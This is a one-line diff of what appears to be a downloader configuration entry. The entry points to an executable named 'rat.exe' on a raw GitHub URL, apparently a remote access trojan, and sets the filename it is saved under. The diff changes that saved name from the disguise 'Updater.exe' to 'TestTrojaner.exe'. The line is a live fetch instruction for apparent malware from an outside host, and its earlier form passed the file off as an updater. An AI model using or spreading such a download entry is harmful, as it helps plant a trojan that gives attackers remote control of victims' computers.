@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/syrabrox/own/main/rat.exe:Updater.exe
+https://raw.githubusercontent.com/syrabrox/own/main/rat.exe:TestTrojaner.exe
